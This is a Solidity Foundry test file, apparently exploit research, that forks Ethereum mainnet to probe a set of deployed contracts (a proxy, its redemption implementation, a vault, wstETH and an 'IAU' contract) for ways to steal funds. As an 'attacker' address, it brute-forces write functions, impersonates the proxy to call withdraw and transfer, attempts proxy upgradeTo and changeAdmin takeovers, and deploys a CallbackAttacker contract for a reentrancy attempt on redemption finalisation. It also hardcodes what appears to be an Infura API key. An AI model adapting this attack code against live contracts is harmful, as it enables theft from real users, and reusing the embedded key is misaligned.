// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

/**
 * IAU EXPLOIT
 *
 * FINDING: RC slot 5 = IAU (0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a)
 * This is a real contract with code!
 *
 * If IAU can be called in a way that triggers RC's transferFrom...
 */
contract IAUExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_IAUAnalysis() public {
        console.log("=== IAU ANALYSIS ===\n");

        console.log("IAU address:", IAU);
        console.log("IAU code size:", IAU.code.length);

        if (IAU.code.length == 0) {
            console.log("IAU HAS NO CODE - empty address!");
            return;
        }

        // Check IAU storage
        console.log("\nIAU storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(IAU, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Try common functions
        console.log("\nTesting IAU functions:");

        (bool s1, bytes memory d1) = IAU.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length > 0) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = IAU.staticcall(abi.encodeWithSignature("admin()"));
        if (s2 && d2.length > 0) {
            console.log("admin():", abi.decode(d2, (address)));
        }

        (bool s3, bytes memory d3) = IAU.staticcall(abi.encodeWithSignature("redemption()"));
        if (s3 && d3.length > 0) {
            console.log("redemption():", abi.decode(d3, (address)));
        }

        (bool s4, bytes memory d4) = IAU.staticcall(abi.encodeWithSignature("vault()"));
        if (s4 && d4.length > 0) {
            console.log("vault():", abi.decode(d4, (address)));
        }

        (bool s5, bytes memory d5) = IAU.staticcall(abi.encodeWithSignature("asset()"));
        if (s5 && d5.length > 0) {
            console.log("asset():", abi.decode(d5, (address)));
        }
    }

    function test_IAUFunctionScan() public {
        console.log("=== IAU FUNCTION SCAN ===\n");

        if (IAU.code.length == 0) {
            console.log("IAU has no code");
            return;
        }

        vm.startPrank(attacker);

        // Test write functions
        bytes4[] memory sigs = new bytes4[](30);
        sigs[0] = bytes4(keccak256("redeem(uint256)"));
        sigs[1] = bytes4(keccak256("withdraw(uint256)"));
        sigs[2] = bytes4(keccak256("deposit(uint256)"));
        sigs[3] = bytes4(keccak256("claim()"));
        sigs[4] = bytes4(keccak256("harvest()"));
        sigs[5] = bytes4(keccak256("update()"));
        sigs[6] = bytes4(keccak256("sync()"));
        sigs[7] = bytes4(keccak256("process()"));
        sigs[8] = bytes4(keccak256("execute()"));
        sigs[9] = bytes4(keccak256("finalize()"));
        sigs[10] = bytes4(keccak256("complete()"));
        sigs[11] = bytes4(keccak256("trigger()"));
        sigs[12] = bytes4(keccak256("callback()"));
        sigs[13] = bytes4(keccak256("notify()"));
        sigs[14] = bytes4(keccak256("notifyRewardAmount(uint256)"));
        sigs[15] = bytes4(keccak256("updateRewards()"));
        sigs[16] = bytes4(keccak256("getReward()"));
        sigs[17] = bytes4(keccak256("exit()"));
        sigs[18] = bytes4(keccak256("stake(uint256)"));
        sigs[19] = bytes4(keccak256("unstake(uint256)"));
        sigs[20] = bytes4(keccak256("mint(address,uint256)"));
        sigs[21] = bytes4(keccak256("burn(uint256)"));
        sigs[22] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[23] = bytes4(keccak256("approve(address,uint256)"));
        sigs[24] = bytes4(keccak256("increaseAllowance(address,uint256)"));
        sigs[25] = bytes4(keccak256("addLiquidity(uint256)"));
        sigs[26] = bytes4(keccak256("removeLiquidity(uint256)"));
        sigs[27] = bytes4(keccak256("swap(uint256)"));
        sigs[28] = bytes4(keccak256("processRedemption(address,uint256)"));
        sigs[29] = bytes4(keccak256("completeRedemption(address,uint256)"));

        console.log("Testing write functions...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = IAU.call{gas: 100000}(abi.encodeWithSelector(sigs[i], 1000e18));
            if (s) {
                console.log("SUCCESS: selector %d", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();
    }

    function test_IAUBytecodeAnalysis() public view {
        console.log("=== IAU BYTECODE ANALYSIS ===\n");

        bytes memory code = IAU.code;
        console.log("Code size:", code.length);

        if (code.length == 0) return;

        // Count opcodes
        uint delegatecalls = 0;
        uint calls = 0;
        uint staticcalls = 0;
        uint selfdestruct = 0;
        uint sstore = 0;

        for (uint i = 0; i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0xF4) delegatecalls++;
            if (op == 0xF1) calls++;
            if (op == 0xFA) staticcalls++;
            if (op == 0xFF) selfdestruct++;
            if (op == 0x55) sstore++;
        }

        console.log("DELEGATECALL (0xF4):", delegatecalls);
        console.log("CALL (0xF1):", calls);
        console.log("STATICCALL (0xFA):", staticcalls);
        console.log("SELFDESTRUCT (0xFF):", selfdestruct);
        console.log("SSTORE (0x55):", sstore);

        // Look for transferFrom
        bytes4 transferFrom = 0x23b872dd;
        for (uint i = 0; i < code.length - 4; i++) {
            if (code[i] == 0x23 && code[i+1] == 0xb8 && code[i+2] == 0x72 && code[i+3] == 0xdd) {
                console.log("transferFrom at offset:", i);
            }
        }
    }

    function test_IAUCallFromRC() public {
        console.log("=== IAU CALL FROM RC ===\n");

        // When R0 delegatecalls RC, and RC calls IAU:
        // - RC (executing in R0's context) calls IAU
        // - msg.sender to IAU is R0 (not original caller)
        // - IAU might trust calls from R0

        // Check if IAU has any authorization based on msg.sender
        bytes32 slot0 = vm.load(IAU, bytes32(uint256(0)));
        console.log("IAU slot 0:");
        console.logBytes32(slot0);

        address iauOwner = address(uint160(uint256(slot0)));
        console.log("Potential owner:", iauOwner);

        if (iauOwner == R0) {
            console.log("\n*** IAU IS OWNED BY R0! ***");
        }

        // Try calling IAU as R0
        vm.startPrank(R0);

        console.log("\nCalling IAU as R0:");
        (bool s1,) = IAU.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw:", s1);

        (bool s2,) = IAU.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18));
        console.log("transfer:", s2);

        (bool s3,) = IAU.call(abi.encodeWithSignature("execute(bytes)", abi.encode(attacker)));
        console.log("execute:", s3);

        vm.stopPrank();
    }

    function test_RCInternalCalls() public {
        console.log("=== RC INTERNAL CALLS ===\n");

        // Analyze what RC calls internally
        bytes memory rcCode = RC.code;

        // Look for address patterns
        // R0: 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85
        // VAULT: 0x551d155760ae96050439AD24Ae98A96c765d761B
        // wstETH: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
        // IAU: 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a

        console.log("RC code size:", rcCode.length);

        // Search for hardcoded addresses
        address[] memory addrs = new address[](5);
        addrs[0] = R0;
        addrs[1] = VAULT;
        addrs[2] = wstETH;
        addrs[3] = IAU;
        addrs[4] = TASSET;

        string[] memory names = new string[](5);
        names[0] = "R0";
        names[1] = "VAULT";
        names[2] = "wstETH";
        names[3] = "IAU";
        names[4] = "TASSET";

        for (uint a = 0; a < addrs.length; a++) {
            bytes20 addrBytes = bytes20(addrs[a]);
            for (uint i = 0; i < rcCode.length - 20; i++) {
                bool found = true;
                for (uint j = 0; j < 20; j++) {
                    if (rcCode[i + j] != addrBytes[j]) {
                        found = false;
                        break;
                    }
                }
                if (found) {
                    console.log("%s found at offset: %d", names[a], i);
                }
            }
        }
    }

    function test_TriggerRCViaCallback() public {
        console.log("=== TRIGGER RC VIA CALLBACK ===\n");

        // What if we can trigger RC through a callback mechanism?
        // e.g., if we flash loan or do some operation that triggers a callback to RC

        // Deploy callback contract
        CallbackAttacker cb = new CallbackAttacker(R0, RC, VAULT, wstETH, TASSET);

        deal(TASSET, address(cb), 10000e18);
        deal(wstETH, address(cb), 100e18);

        console.log("Attempting callback attack...");
        cb.attack();

        console.log("Callback attacker wstETH:", IERC20(wstETH).balanceOf(address(cb)) / 1e18);
    }

    function test_ExploitRCStorageContext() public {
        console.log("=== EXPLOIT RC STORAGE CONTEXT ===\n");

        // RC's storage has delay=0
        // If we can make R0 delegatecall to something that uses RC's storage...

        // What if there's a CREATE2 address collision?
        // Or what if we can deploy our own contract at a predictable address?

        // Check if RC was deployed via CREATE2
        console.log("RC address:", RC);

        // Calculate what address RC would have if deployed by R0
        // If R0 deployed RC via CREATE: nonce-based
        // If R0 deployed RC via CREATE2: salt + bytecode hash

        // This is complex and probably not exploitable...

        // Instead, let's check if there's any way to call RC such that
        // it reads from a different storage context
    }

    function test_ProxyContextConfusion() public {
        console.log("=== PROXY CONTEXT CONFUSION ===\n");

        // R0 is a proxy that delegatecalls RC
        // What if we can confuse the proxy's implementation pointer?

        // Check admin slot
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        bytes32 r0Admin = vm.load(R0, adminSlot);
        console.log("R0 admin slot:");
        console.logBytes32(r0Admin);

        address admin = address(uint160(uint256(r0Admin)));
        if (admin != address(0)) {
            console.log("Admin:", admin);

            // Try calling admin functions
            vm.startPrank(attacker);

            (bool s1,) = R0.call(abi.encodeWithSignature("upgradeTo(address)", attacker));
            console.log("upgradeTo:", s1);

            (bool s2,) = R0.call(abi.encodeWithSignature("changeAdmin(address)", attacker));
            console.log("changeAdmin:", s2);

            vm.stopPrank();
        }
    }

    function test_CrossContractReentrancy() public {
        console.log("=== CROSS-CONTRACT REENTRANCY ===\n");

        // During redemption finalization:
        // 1. R0 delegatecalls RC
        // 2. RC calls wstETH.transferFrom(VAULT, user, amount)
        // 3. If wstETH has hooks (it's wrapped stETH)...

        // Check if wstETH has any callback mechanisms
        bytes memory wstethCode = wstETH.code;
        console.log("wstETH code size:", wstethCode.length);

        // Look for callback patterns
        // ERC777 has tokensReceived
        // Some tokens call to() address

        // wstETH is a wrapper around stETH
        // It shouldn't have callbacks but let's verify

        // Look for CALL opcodes after transfer
        uint callCount = 0;
        for (uint i = 0; i < wstethCode.length; i++) {
            if (uint8(wstethCode[i]) == 0xF1) {
                callCount++;
            }
        }
        console.log("CALL opcodes in wstETH:", callCount);
    }
}

contract CallbackAttacker {
    address r0;
    address rc;
    address vault;
    address wsteth;
    address tasset;
    bool attacking;

    constructor(address _r0, address _rc, address _vault, address _wsteth, address _tasset) {
        r0 = _r0;
        rc = _rc;
        vault = _vault;
        wsteth = _wsteth;
        tasset = _tasset;
    }

    function attack() external {
        attacking = true;
        IERC20(tasset).approve(r0, type(uint256).max);
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        attacking = false;
    }

    // Various callback functions
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (attacking) {
            rc.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    fallback() external payable {
        if (attacking) {
            rc.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    receive() external payable {}
}
